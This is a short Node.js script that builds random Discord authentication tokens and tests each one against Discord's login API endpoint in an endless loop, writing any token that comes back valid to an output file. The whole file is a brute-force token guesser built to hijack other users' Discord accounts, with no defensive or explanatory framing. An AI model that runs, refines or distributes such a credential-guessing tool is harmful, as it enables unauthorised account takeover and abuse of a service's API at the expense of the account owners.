//Dependencies
const RandomString = require("randomstring")
const Request = require("request")
const Delay = require("delay")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(Self_Args.length == 0){
    console.log(`node index.js <output>
Example: node index.js output_test.txt`)
    process.exit()
}

if(Self_Args[0] == ""){
    console.log("Invalid output.")
    process.exit()
}

Fs.writeFileSync(Self_Args[0], "", "utf8")

G_A_C()
async function G_A_C(){
    await Delay(100)

    var mfa_token = RandomString.generate({
        length: 84,
        charset: "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
    })
    
    mfa_token = `mfa.${mfa_token}`

    var not_mfa_token = RandomString.generate({
        length: 24,
        charset: "ODgyODkxNjE4NDczMDkxMDgy"
    })

    const not_mfa_token_half = RandomString.generate({
        length: 6,
        charset: "YUW2-g"
    })

    const not_mfa_token_half2 = RandomString.generate({
        length: 27,
        charset: "duZXhSN1RwE06PFEHRQkehmNdpw"
    })

    not_mfa_token = `${not_mfa_token}.${not_mfa_token_half}.${not_mfa_token_half2}`

    Request.get("https://discord.com/api/v6/auth/login", {
        headers: {
            "Authorization": mfa_token
        }
    }, function(err, res, body){
        if(err){}

        if(res.statusCode == 200){
            console.log(`Valid token: ${mfa_token}`)

            const data = Fs.readFileSync(Self_Args[0], "utf8")

            if(data.length == 0){
                Fs.writeFileSync(Self_Args[0], mfa_token, "utf8")
            }else{
                Fs.writeFileSync(Self_Args[0], `${data}\n${mfa_token}`, "utf8")
            }
        }else{
            console.log(`Invalid token: ${mfa_token}`)
        }

        R_2()
    })

    function R_2(){
        Request.get("https://discord.com/api/v6/auth/login", {
            headers: {
                "Authorization": not_mfa_token
            }
        }, function(err, res, body){
            if(err){}

            if(res.statusCode == 200){
                console.log(`Valid token: ${not_mfa_token}`)

                const data = Fs.readFileSync(Self_Args[0], "utf8")

                if(data.length == 0){
                    Fs.writeFileSync(Self_Args[0], not_mfa_token, "utf8")
                }else{
                    Fs.writeFileSync(Self_Args[0], `${data}\n${not_mfa_token}`, "utf8")
                }
            }else{
                console.log(`Invalid token: ${not_mfa_token}`)
            }

            G_A_C()
        })
    }
}
